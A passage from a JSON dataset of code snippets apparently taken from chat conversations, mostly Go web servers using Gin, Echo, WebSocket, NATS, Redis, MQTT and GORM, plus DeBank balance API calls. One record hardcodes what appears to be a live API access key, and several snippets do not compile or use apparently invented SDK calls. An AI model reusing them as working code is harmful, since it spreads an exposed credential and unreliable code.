range posts {\n\t\t\tif p.ID == id {\n\t\t\t\tposts[i].Title = updatedPost.Title\n\t\t\t\tposts[i].Content = updatedPost.Content\n\t\t\t\tc.JSON(http.StatusOK, posts[i])\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\tc.JSON(http.StatusNotFound, gin.H{\"error\": \"Post not found\"})\n\t})\n\n\tr.DELETE(\"/posts/:id\", func(c *gin.Context) {\n\t\tid := c.Param(\"id\")\n\n\t\tfor i, p := range posts {\n\t\t\tif p.ID == id {\n\t\t\t\tposts = append(posts[:i], posts[i+1:]...)\n\t\t\t\tc.String(http.StatusOK, \"Post deleted\")\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\tc.JSON(http.StatusNotFound, gin.H{\"error\": \"Post not found\"})\n\t})\n\n\tr.GET(\"/healthz\", func(c *gin.Context) {\n\t\t_, err := rdb.Ping(ctx).Result()\n\t\tif err != nil {\n\t\t\tc.String(http.StatusServiceUnavailable, err.Error())\n\t\t\treturn\n\t\t}\n\n\t\tif status := nc.Status(); status != nats.CONNECTED {\n\t\t\tc.String(http.StatusServiceUnavailable, \"NATS not connected\")\n\t\t\treturn\n\t\t}\n\n\t\tc.String(http.StatusOK, \"OK\")\n\t})\n\n\tr.Run(\":8080\")\n}",
    "filename": "e9f2e5adc6465c01b64cacf9a49fd310_20.go"
  },
  {
    "conversation_hash": "224fd73c421599c1f9a499f65559520c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/gorilla/websocket\"\n)\n\nvar upgrader = websocket.Upgrader{\n\tReadBufferSize:  1024,\n\tWriteBufferSize: 1024,\n\tCheckOrigin: func(r *http.Request) bool {\n\t\treturn true\n\t},\n}\n\nfunc main() {\n\tr := gin.Default()\n\n\tr.GET(\"/ws\", func(c *gin.Context) {\n\t\twsHandler(c.Writer, c.Request)\n\t})\n\n\tr.Run(\":8080\")\n}\n\nfunc wsHandler(w http.ResponseWriter, r *http.Request) {\n\tconn, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tfmt.Printf(\"Failed to set websocket upgrade: %+v\\n\", err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\tfor {\n\t\t// Чтение сообщения от клиента через соединение WebSocket\n\t\tmsgType, msg, err := conn.ReadMessage()\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"Failed to read message: %v\\n\", err)\n\t\t\tbreak\n\t\t}\n\n\t\t// Ответ клиенту с использованием типа сообщения и отрывая палиндром от сообщения\n\t\terr = conn.WriteMessage(msgType, []byte(\"reply: \"))\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"Failed to write message: %v\\n\", err)\n\t\t\tbreak\n\t\t}\n\t}\n}",
    "filename": "224fd73c421599c1f9a499f65559520c_0.go"
  },
  {
    "conversation_hash": "224fd73c421599c1f9a499f65559520c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "r.Any(\"/socket/*any\", func(c *gin.Context) {\n    c.Header(\"Access-Control-Allow-Origin\", \"*\")\n    c.Header(\"Access-Control-Allow-Methods\", \"GET, OPTIONS\")\n    c.Header(\"Access-Control-Allow-Headers\", \"gosf-session\")\n\n    if c.Request.Method == \"OPTIONS\" {\n        c.Status(http.StatusOK)\n    } else {\n        gosf.ClientInbound(c.Writer, c.Request)\n    }\n})",
    "filename": "224fd73c421599c1f9a499f65559520c_1.go"
  },
  {
    "conversation_hash": "224fd73c421599c1f9a499f65559520c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"fmt\"\n    \"net/http\"\n\n    gosf \"github.com/ambelovsky/gosf\"\n    \"github.com/gin-gonic/gin\"\n)\n\nvar ctx = context.Background()\n\nfunc main() {\n    r := gin.Default()\n\n    // Интегриция GOSF с Gin\n    gosf.Startup(map[string]interface{}{\"port\": 8080})\n\n    gosf.OnConnect(func(client *gosf.Client, request *gosf.Request) {\n        log.Println(\"Client connected.\")\n    })\n\n    gosf.OnDisconnect(func(client *gosf.Client, request *gosf.Request) {\n        log.Println(\"Client disconnected.\")\n    })\n\n    gosf.Listen(\"/\", func(client *gosf.Client, request *gosf.Request) {\n        log.Printf(\"Received message from %s: %v\\n\", c.Id(), r)\n        gosf.Broadcast(\"message\", r)\n    })\n\n    // Gin обработчик для обслуживания GOSF клиентов\n    r.Any(\"/socket/*any\", func(c *gin.Context) {\n        c.Header(\"Access-Control-Allow-Origin\", \"*\")\n        c.Header(\"Access-Control-Allow-Methods\", \"GET, OPTIONS\")\n        c.Header(\"Access-Control-Allow-Headers\", \"gosf-session\")\n\n        if c.Request.Method == \"OPTIONS\" {\n            c.Status(http.StatusOK)\n        } else {\n            gosf.ClientInbound(c.Writer, c.Request)\n        }\n    })\n\n    r.Run(\":8080\")\n}",
    "filename": "224fd73c421599c1f9a499f65559520c_2.go"
  },
  {
    "conversation_hash": "7ee4ac33388d01d2ca24bd3cbf530898",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "r.POST(\"/echo\", func(c *gin.Context) {\n\tvar jsonData interface{}\n\tif err := c.BindJSON(&jsonData); err != nil {\n\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\treturn\n\t}\n\tc.JSON(http.StatusOK, jsonData)\n})",
    "filename": "7ee4ac33388d01d2ca24bd3cbf530898_0.go"
  },
  {
    "conversation_hash": "7ee4ac33388d01d2ca24bd3cbf530898",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/go-redis/redis/v8\"\n\t\"github.com/googollee/go-socket.io\"\n\t\"github.com/nats-io/nats.go\"\n)\n\nvar ctx = context.Background()\n\ntype Post struct {\n\tID      string `json:\"id\"`\n\tTitle   string `json:\"title\"`\n\tContent string `json:\"content\"`\n}\n\nvar posts = []Post{\n\t{\n\t\tID:      \"1\",\n\t\tTitle:   \"First Post\",\n\t\tContent: \"This is the content of the first post.\",\n\t},\n}\n\nfunc main() {\n\tr := gin.Default()\n\n\tsocketServer := socketio.NewServer(nil)\n\n\tsocketServer.OnConnect(\"/\", func(s socketio.Conn) error {\n\t\tlog.Printf(\"Connected Socket ID: %s\", s.ID())\n\t\ts.Join(\"room\")\n\t\ts.Emit(\"message\", \"Welcome to the chat room\")\n\t\treturn nil\n\t})\n\n\tsocketServer.OnEvent(\"/\", \"message\", func(s socketio.Conn, msg string) {\n\t\tlog.Printf(\"Received message from %s: %s\\n\", s.ID(), msg)\n\t\tsocketServer.BroadcastToRoom(\"\", \"room\", \"message\", msg)\n\t})\n\n\tsocketServer.OnError(\"/\", func(s socketio.Conn, e error) {\n\t\tlog.Println(\"Error with socket connection:\", e)\n\t})\n\n\tsocketServer.OnDisconnect(\"/\", func(s socketio.Conn, reason string) {\n\t\tlog.Printf(\"Disconnected Socket ID: %s\", s.ID())\n\t})\n\n\tgo func() {\n\t\tif err := socketServer.Serve(); err != nil {\n\t\t\tlog.Fatalf(\"socketio listen error: %s\\n\", err)\n\t\t}\n\t}()\n\tdefer socketServer.Close()\n\n\tr.GET(\"/socket.io/*any\", gin.WrapH(socketServer))\n\tr.POST(\"/socket.io/*any\", gin.WrapH(socketServer))\n\n\tnc, err := nats.Connect(nats.DefaultURL)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer nc.Close()\n\n\trdb := redis.NewClient(&redis.Options{\n\t\tAddr:     \"localhost:6379\",\n\t\tPassword: \"\",\n\t\tDB:       0,\n\t})\n\n\tpong, err := rdb.Ping(ctx).Result()\n\tfmt.Println(pong, err)\n\n\tr.GET(\"/posts\", func(c *gin.Context) {\n\t\tc.JSON(http.StatusOK, posts)\n\t})\n\n\tr.POST(\"/posts\", func(c *gin.Context) {\n\t\tvar post Post\n\t\tif err := c.BindJSON(&post); err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tposts = append(posts, post)\n\t\tsocketServer.BroadcastToRoom(\"\", \"room\", \"post\", post)\n\t\tc.JSON(http.StatusCreated, post)\n\t})\n\n\tr.PUT(\"/posts/:id\", func(c *gin.Context) {\n\t\tid := c.Param(\"id\")\n\t\tvar updatedPost Post\n\t\tif err := c.BindJSON(&updatedPost); err != nil {\n\t\t\tc.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n\t\t\treturn\n\t\t}\n\n\t\tfor i, p := range posts {\n\t\t\tif p.ID == id {\n\t\t\t\tposts[i].Title = updatedPost.Title\n\t\t\t\tposts[i].Content = updatedPost.Content\n\t\t\t\tc.JSON(http.StatusOK, posts[i])\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\tc.JSON(http.StatusNotFound, gin.H{\"error\": \"Post not found\"})\n\t})\n\n\tr.DELETE(\"/posts/:id\", func(c *gin.Context) {\n\t\tid := c.Param(\"id\")\n\n\t\tfor i, p := range posts {\n\t\t\tif p.ID == id {\n\t\t\t\tposts = append(posts[:i], posts[i+1:]...)\n\t\t\t\tc.String(http.StatusOK, \"Post deleted\")\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\tc.JSON(http.StatusNotFound, gin.H{\"error\": \"Post not found\"})\n\t})\n\n\tr.GET(\"/healthz\", func(c *gin.Context) {\n\t\t_, err := rdb.Ping(ctx).Result()\n\t\tif err != nil {\n\t\t\tc.String(http.StatusServiceUnavailable, err.Error())\n\t\t\treturn\n\t\t}\n\n\t\tif status := nc.Status(); status != nats.CONNECTED {\n\t\t\tc.String(http.StatusServiceUnavailable, \"NATS not connected\")\n\t\t\treturn\n\t\t}\n\t\tc.String(http.StatusOK, \"OK\")\n\t})\n\n\tr.Run(\":8080\")\n}",
    "filename": "7ee4ac33388d01d2ca24bd3cbf530898_1.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\n\t\"github.com/labstack/echo/v4\"\n\t\"github.com/labstack/echo/v4/middleware\"\n\t\"github.com/eclipse/paho.mqtt.golang\"\n)",
    "filename": "d392f4eb252077eac954b6259928700f_1.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func connectMQTT() paho.Client {\n\t// Buat konfigurasi MQTT\n\topts := paho.NewClientOptions()\n\topts.AddBroker(\"tcp://localhost:1883\") // Ganti \"localhost\" dengan alamat broker MQTT Anda\n\topts.SetClientID(\"go-echo-mqtt-integration\")\n\n\t// Set handler\n\topts.SetDefaultPublishHandler(mqttHandler)\n\n\t// Koneksi ke broker\n\tclient := paho.NewClient(opts)\n\tif token := client.Connect(); token.Wait() && token.Error() != nil {\n\t\tlog.Fatal(token.Error())\n\t}\n\n\t// Subscribe ke topik\n\tif token := client.Subscribe(\"test/topic\", 1, nil); token.Wait() && token.Error() != nil {\n\t\tlog.Fatal(token.Error())\n\t}\n\n\treturn client\n}",
    "filename": "d392f4eb252077eac954b6259928700f_3.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\t// Koneksi ke MQTT broker\n\tmqttClient := connectMQTT()\n\tdefer mqttClient.Disconnect(250)\n\n\t// Membuat server Echo\n\te := echo.New()\n\n\t// Middleware\n\te.Use(middleware.Logger())\n\te.Use(middleware.Recover())\n\n\t// Route\n\te.POST(\"/publish\", func(c echo.Context) error {\n\t\tpayload := c.FormValue(\"payload\")\n\n\t\t// Kirim pesan MQTT ke topik\n\t\tmqttClient.Publish(\"test/topic\", 1, false, payload)\n\n\t\treturn c.String(http.StatusOK, \"Payload published to MQTT broker\")\n\t})\n\n\t// Mulai server\n\te.Start(\":8080\")\n}",
    "filename": "d392f4eb252077eac954b6259928700f_4.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"log\"\n\t\"os\"\n\t\"net/http\"\n\n\t\"github.com/labstack/echo/v4\"\n\t\"github.com/labstack/echo/v4/middleware\"\n\t\"github.com/eclipse/paho.mqtt.golang\"\n\t\"gorm.io/gorm\"\n\t\"gorm.io/driver/postgres\"\n)",
    "filename": "d392f4eb252077eac954b6259928700f_7.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "type Message struct {\n\tgorm.Model\n\tTopic   string\n\tPayload string\n}",
    "filename": "d392f4eb252077eac954b6259928700f_8.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "func connectDB() (*gorm.DB, error) {\n\tdsn := \"user=gorm password=gorm dbname=gorm host=localhost port=5432 sslmode=disable\"\n\tdb, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\treturn db, err\n}",
    "filename": "d392f4eb252077eac954b6259928700f_9.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "func mqttHandler(db *gorm.DB) func(client paho.Client, msg paho.Message) {\n\treturn func(client paho.Client, msg paho.Message) {\n\t\tlog.Printf(\"Topic: %s, Message: %s\\n\", msg.Topic(), msg.Payload())\n\n\t\tmessage := Message{\n\t\t\tTopic:   msg.Topic(),\n\t\t\tPayload: string(msg.Payload()),\n\t\t}\n\t\tdb.Create(&message)\n\t}\n}",
    "filename": "d392f4eb252077eac954b6259928700f_10.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "func connectMQTT(db *gorm.DB) paho.Client {\n\topts := paho.NewClientOptions()\n\topts.AddBroker(\"tcp://localhost:1883\")\n\topts.SetClientID(\"go-echo-mqtt-integration\")\n\n\t// Set handler\n\topts.SetDefaultPublishHandler(mqttHandler(db))\n\n\tclient := paho.NewClient(opts)\n\tif token := client.Connect(); token.Wait() && token.Error() != nil {\n\t\tlog.Fatal(token.Error())\n\t}\n\n\tif token := client.Subscribe(\"test/topic\", 1, nil); token.Wait() && token.Error() != nil {\n\t\tlog.Fatal(token.Error())\n\t}\n\n\treturn client\n}",
    "filename": "d392f4eb252077eac954b6259928700f_11.go"
  },
  {
    "conversation_hash": "d392f4eb252077eac954b6259928700f",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\t// Koneksi ke database PostgreSQL\n\tdb, err := connectDB()\n\tif err != nil {\n\t\tlog.Fatal(\"Failed to connect to database\")\n\t\tos.Exit(1)\n\t}\n\n\t// Cek dan migrasi tabel\n\tdb.AutoMigrate(&Message{})\n\n\t// Koneksi ke MQTT broker\n\tmqttClient := connectMQTT(db)\n\tdefer mqttClient.Disconnect(250)\n\n\t// Membuat server Echo\n\te := echo.New()\n\n\te.Use(middleware.Logger())\n\te.Use(middleware.Recover())\n\n\te.POST(\"/publish\", func(c echo.Context) error {\n\t\tpayload := c.FormValue(\"payload\")\n\n\t\tmqttClient.Publish(\"test/topic\", 1, false, payload)\n\n\t\treturn c.String(http.StatusOK, \"Payload published to MQTT broker\")\n\t})\n\n\t// Mulai server\n\te.Start(\":8080\")\n}",
    "filename": "d392f4eb252077eac954b6259928700f_12.go"
  },
  {
    "conversation_hash": "7b88868d0e5770306a3c1648246f00fb",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "Office",
      "VPC"
    ],
    "code": "provider \"aws\" {\n  region = \"us-east-1\"\n}\n\n// VPC and Subnets\nmodule \"vpc\" {\n  source = \"terraform-aws-modules/vpc/aws\"\n  name = \"google-meet-vpc\"\n  cidr = \"10.0.0.0/16\"\n  azs = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\n\n  public_subnet_cidrs = [\n    \"10.0.1.0/24\",\n    \"10.0.2.0/24\",\n    \"10.0.3.0/24\"\n  ]\n\n  private_subnet_cidrs = [\n    \"10.0.11.0/24\",\n    \"10.0.12.0/24\",\n    \"10.0.13.0/24\"\n  ]\n\n  enable_nat_gateway = true\n}\n\n// Security Group\nresource \"aws_security_group\" \"google_meet_sg\" {\n  name = \"google_meet_sg\"\n  description = \"Security group for Google Meet Application\"\n  vpc_id = module.vpc.vpc_id\n\n  ingress {\n    description = \"HTTP from VPC\"\n    from_port = 80\n    to_port = 80\n    protocol = \"tcp\"\n    cidr_blocks = [\"10.0.0.0/8\"]\n  }\n\n  ingress {\n    description = \"SSH from Office\"\n    from_port = 22\n    to_port = 22\n    protocol = \"tcp\"\n    cidr_blocks = [\"x.x.x.x/32\"]\n  }\n}\n\n// EC2 and Load Balancer\nmodule \"google_meet_app\" {\n  source = \"terraform-aws-modules/ec2-instance/aws\"\n  name = \"google-meet-instance\"\n  instance_count = 3\n  ami = \"ami-0000000000\"\n  instance_type = \"t2.micro\"\n  key_name = \"google-meet-key\"\n  vpc_security_group_ids = [aws_security_group.google_meet_sg.id]\n  subnet_id = module.vpc.public_subnets[0]\n  associate_public_ip_address = true\n  user_data = file(\"startup-script.sh\")\n}\n\nresource \"aws_lb\" \"lb\" {\n  name = \"google-meet-lb\"\n  internal = false\n  load_balancer_type = \"application\"\n\n  subnets = module.vpc.public_subnets\n  security_groups = [aws_security_group.google_meet_sg.id]\n\n  access_logs {\n    bucket = \"google-meet-logs\"\n  }\n\n  tags = {\n    Environment = \"Production\"\n  }\n\n  depends_on = [\n    module.google_meet_app\n  ]\n}\n\nresource \"aws_lb_target_group\" \"target_groups\" {\n  name_prefix = \"google-meet-tg\"\n  port = 80\n  protocol = \"HTTP\"\n  target_type = \"instance\"\n  vpc_id = module.vpc.vpc_id\n\n  health_check {\n    healthy_threshold = 3\n    interval = 30\n    path = \"/\"\n    port = 80\n    protocol = \"HTTP\"\n    timeout = 5\n    unhealthy_threshold = 3\n  }\n\n  depends_on = [\n    aws_lb.lb\n  ]\n}\n\nresource \"aws_lb_listener\" \"listener\" {\n  load_balancer_arn = aws_lb.lb.arn\n  port = \"80\"\n  protocol = \"HTTP\"\n\n  default_action {\n    target_group_arn = aws_lb_target_group.target_groups.arn\n    type = \"forward\"\n  }\n}\n\n// Outputs\noutput \"load_balancer_dns_name\" {\n  value = aws_lb.lb.dns_name\n}\n\noutput \"instance_ips\" {\n  value = module.google_meet_app.public_ip\n}",
    "filename": "7b88868d0e5770306a3c1648246f00fb_1.go"
  },
  {
    "conversation_hash": "5114cb47f8ae5630a00f17ddf3703911",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/csv\"\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    // 打开CSV文件\n    file, err := os.Open(\"data.csv\")\n    if err != nil {\n        fmt.Println(\"Error:\", err)\n        return\n    }\n    defer file.Close()\n\n    // 创建CSV解析器\n    reader := csv.NewReader(file)\n\n    // 读取CSV文件的内容，并循环处理每一行\n    for {\n        record, err := reader.Read()\n        if err != nil {\n            break\n        }\n\n        // 判断第二列的字符串长度是否为32\n        if len(record[1]) == 32 {\n            fmt.Println(\"true\")\n        }\n    }\n}",
    "filename": "5114cb47f8ae5630a00f17ddf3703911_0.go"
  },
  {
    "conversation_hash": "b306edc5356c855e5bcc8f6285fb0330",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "url := \"https://pro-openapi.debank.com/v1/user/total_balance?id=0x5853ed4f26a3fcea565b3fbc698bb19cdf6deb85\"\nreq, err := http.NewRequest(\"GET\", url, nil)\nif err != nil {\n    panic(err)\n}",
    "filename": "b306edc5356c855e5bcc8f6285fb0330_9.go"
  },
  {
    "conversation_hash": "b306edc5356c855e5bcc8f6285fb0330",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "client := http.Client{}\nresp, err := client.Do(req)\nif err != nil {\n    panic(err)\n}\ndefer resp.Body.Close()",
    "filename": "b306edc5356c855e5bcc8f6285fb0330_11.go"
  },
  {
    "conversation_hash": "b306edc5356c855e5bcc8f6285fb0330",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "body, err := ioutil.ReadAll(resp.Body)\nif err != nil {\n    panic(err)\n}\n\nfmt.Printf(\"Response body: %s\\n\", body)",
    "filename": "b306edc5356c855e5bcc8f6285fb0330_12.go"
  },
  {
    "conversation_hash": "b306edc5356c855e5bcc8f6285fb0330",
    "code_index": 13,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"io/ioutil\"\n)\n\nfunc main() {\n    url := \"https://pro-openapi.debank.com/v1/user/total_balance?id=0x5853ed4f26a3fcea565b3fbc698bb19cdf6deb85\"\n    req, err := http.NewRequest(\"GET\", url, nil)\n\n    if err != nil {\n        panic(err)\n    }\n\n    req.Header.Set(\"accept\", \"application/json\")\n    req.Header.Set(\"AccessKey\", \"YOUR_ACCESSKEY\")\n\n    client := http.Client{}\n    resp, err := client.Do(req)\n\n    if err != nil {\n        panic(err)\n    }\n\n    defer resp.Body.Close()\n\n    body, err := ioutil.ReadAll(resp.Body)\n\n    if err != nil {\n        panic(err)\n    }\n\n    fmt.Printf(\"Response body: %s\\n\", body)\n}",
    "filename": "b306edc5356c855e5bcc8f6285fb0330_13.go"
  },
  {
    "conversation_hash": "b306edc5356c855e5bcc8f6285fb0330",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"io/ioutil\"\n    \"net/http\"\n)\n\nfunc getUserTotalBalance(id string) (string, error) {\n    url := fmt.Sprintf(\"https://pro-openapi.debank.com/v1/user/total_balance?id=%s\", id)\n\n    // 创建 GET 请求\n    req, err := http.NewRequest(\"GET\", url, nil)\n    if err != nil {\n        return \"\", err\n    }\n    \n    // 设置请求头\n    req.Header.Set(\"accept\", \"application/json\")\n    req.Header.Set(\"AccessKey\", \"YOUR_ACCESSKEY\")\n\n    // 发送请求\n    client := http.Client{}\n    resp, err := client.Do(req)\n    if err != nil {\n        return \"\", err\n    }\n    \n    // 读取响应体\n    defer resp.Body.Close()\n    body, err := ioutil.ReadAll(resp.Body)\n    if err != nil {\n        return \"\", err\n    }\n    return string(body), nil\n}",
    "filename": "b306edc5356c855e5bcc8f6285fb0330_14.go"
  },
  {
    "conversation_hash": "b306edc5356c855e5bcc8f6285fb0330",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "response, err := getUserTotalBalance(\"0x5853ed4f26a3fcea565b3fbc698bb19cdf6deb85\")\nif err != nil {\n    panic(err)\n}\nfmt.Printf(\"The response is: %s\\n\", response)",
    "filename": "b306edc5356c855e5bcc8f6285fb0330_15.go"
  },
  {
    "conversation_hash": "d441cc57a4f433dd4a2d0c0548e66373",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n)\n\ntype ChainInfo struct {\n\tID              string  `json:\"id\"`\n\tCommunityID     int     `json:\"community_id\"`\n\tName            string  `json:\"name\"`\n\tNativeTokenID   string  `json:\"native_token_id\"`\n\tLogoURL         string  `json:\"logo_url\"`\n\tWrappedTokenID  string  `json:\"wrapped_token_id\"`\n\tUSDValue        float64 `json:\"usd_value\"`\n}\n\ntype TotalValue struct {\n\tTotalUSDValue float64     `json:\"total_usd_value\"`\n\tChainList     []ChainInfo `json:\"chain_list\"`\n}\n\nfunc main() {\n\tjsonStr := `\n{\n  \"total_usd_value\": 27654.142997146177,\n  \"chain_list\": [\n    {\n      \"id\": \"eth\",\n      \"community_id\": 1,\n      \"name\": \"Ethereum\",\n      \"native_token_id\": \"eth\",\n      \"logo_url\": \"https://static.debank.com/image/chain/logo_url/eth/42ba589cd077e7bdd97db6480b0ff61d.png\",\n      \"wrapped_token_id\": \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\",\n      \"usd_value\": 11937.702345945296\n    },\n    {\n      \"id\": \"bsc\",\n      \"community_id\": 56,\n      \"name\": \"BSC\",\n      \"native_token_id\": \"bsc\",\n      \"logo_url\": \"https://static.debank.com/image/chain/logo_url/bsc/7c87af7b52853145f6aa790d893763f1.png\",\n      \"wrapped_token_id\": \"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c\",\n      \"usd_value\": 2279.5321187397594\n    }\n  ]\n}\n`\n\tvar totalValue TotalValue\n\n\terr := json.Unmarshal([]byte(jsonStr), &totalValue)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tfmt.Println(totalValue.TotalUSDValue > 1) //输出 true\n}",
    "filename": "d441cc57a4f433dd4a2d0c0548e66373_0.go"
  },
  {
    "conversation_hash": "d441cc57a4f433dd4a2d0c0548e66373",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\ntype ChainInfo struct {\n\tID             string  `json:\"id\"`\n\tCommunityID    int     `json:\"community_id\"`\n\tName           string  `json:\"name\"`\n\tNativeTokenID  string  `json:\"native_token_id\"`\n\tLogoURL        string  `json:\"logo_url\"`\n\tWrappedTokenID string  `json:\"wrapped_token_id\"`\n\tUSDValue       float64 `json:\"usd_value\"`\n}\n\ntype TotalValue struct {\n\tTotalUSDValue float64     `json:\"total_usd_value\"`\n\tChainList     []ChainInfo `json:\"chain_list\"`\n}\n\nfunc getUserTotalBalance(id string) (float64, error) {\n\turl := fmt.Sprintf(\"https://pro-openapi.debank.com/v1/user/total_balance?id=%s\", id)\n\n\t// 创建 GET 请求\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\n\t// 设置请求头\n\treq.Header.Set(\"accept\", \"application/json\")\n\treq.Header.Set(\"AccessKey\", \"ab27cbc04cd00ced99eaa5b2f8c9b503ca155621\")\n\n\t// 发送请求\n\tclient := http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\n\t// 读取响应体\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\n\t// 解析 JSON 数据\n\tvar totalValue TotalValue\n\terr = json.Unmarshal(body, &totalValue)\n\tif err != nil {\n\t\treturn 0, err\n\t}\n\n\t// 返回结果\n\tif totalValue.TotalUSDValue > 1 {\n\t\treturn totalValue.TotalUSDValue, nil\n\t} else {\n\t\treturn 0, nil\n\t}\n}\n\nfunc main() {\n\tid := \"your_user_id\"\n\ttotalValue, err := getUserTotalBalance(id)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tfmt.Println(totalValue)\n}",
    "filename": "d441cc57a4f433dd4a2d0c0548e66373_1.go"
  },
  {
    "conversation_hash": "d441cc57a4f433dd4a2d0c0548e66373",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "type Example struct {\n    ID    int    `json:\"id\"`\n    Name  string `json:\"name\"`\n    Email string `json:\"email\"`\n}",
    "filename": "d441cc57a4f433dd4a2d0c0548e66373_2.go"
  },
  {
    "conversation_hash": "d441cc57a4f433dd4a2d0c0548e66373",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "type Example struct {\n    ID    int    `json:\"id\"`,\n    Name  string `json:\"name\"`,\n    Email string `json:\"email\"`,\n}",
    "filename": "d441cc57a4f433dd4a2d0c0548e66373_3.go"
  },
  {
    "conversation_hash": "d441cc57a4f433dd4a2d0c0548e66373",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "type Example struct {\n    ID    int    `json:\"id\"`\n    Name  string `json:\"name\"`\n    Email string `json:\"id\"`\n}",
    "filename": "d441cc57a4f433dd4a2d0c0548e66373_4.go"
  },
  {
    "conversation_hash": "4ff44694d50e273fbc1988048ddcdf26",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"context\"\n    \"crypto/ecdsa\"\n    \"fmt\"\n    \"log\"\n    \"math/big\"\n\n    \"github.com/ethereum/go-ethereum/common\"\n    \"github.com/ethereum/go-ethereum/crypto\"\n    \"github.com/ethereum/go-ethereum/ethclient\"\n\n    \"github.com/binance-chain/go-sdk/common/types\"\n    \"github.com/binance-chain/go-sdk/client\"\n    \"github.com/binance-chain/go-sdk/keys\"\n)\n\nfunc main() {\n    // Replace with your own private key\n    privateKey, err := crypto.HexToECDSA(\"YOUR_PRIVATE_KEY_HERE\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Replace with your own Binance Smart Chain testnet RPC endpoint\n    client, err := ethclient.Dial(\"https://data-seed-prebsc-1-s1.binance.org:8545\")\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Replace with the recipient address\n    toAddress := common.HexToAddress(\"RECIPIENT_ADDRESS_HERE\")\n\n    // Create a new Binance Smart Chain client\n    binanceClient := client.NewClient(\"https://testnet-dex.binance.org\")\n\n    // Get the account number and sequence of the sender address\n    account, err := binanceClient.AccountManager().GetAccount(context.Background(), privateKey.PublicKey.(ecdsa.PublicKey).Address)\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    // Create a new transfer message\n    transferMsg := types.NewTransferMsg(\n        privateKey.PublicKey.(ecdsa.PublicKey).Address,\n        toAddress,\n        types.Coins{\n            {Denom: \"BNB\", Amount: 